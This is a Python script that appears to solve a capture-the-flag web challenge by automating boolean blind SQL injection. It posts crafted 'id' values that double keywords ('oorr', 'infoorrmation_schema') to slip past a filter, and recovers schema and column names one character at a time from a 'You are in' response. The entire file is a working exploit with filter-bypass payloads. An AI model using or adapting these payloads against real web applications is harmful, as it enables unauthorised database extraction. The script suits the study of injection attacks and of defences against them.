# coding=utf-8
import string

import requests

mystring = string.printable
url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'
# param='database()'
# param='select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=\'ctf_sql_bool_blind\''
param = 'select(column_name)from(infoorrmation_schema.columns)where(table_schema)=\'ctf_sql_bool_blind\'limit(1)'
id = '2\'oorr(mid((' + param + ')from({0})foorr(1))=\'{1}\')oorr\'0'
submit = '提交'
reply = 'You are in'
print(url)
count = 1
result = ''
while(True):
    temp_result=result
    for char in mystring:
        # current_id=id.replace(' ', '/**/')
        current_id = id.format(count,char)
        body={'id':current_id,'submit':submit}
        response=requests.post(url,body)
        # print(response.text)
        if reply in response.text:
            result+=char
            print(result+'......')
            break
    if result==temp_result:
        print('Complete!')
        break
    if '+++' in result:
        print('result: '+result[0:-3])
        break
    count+= 1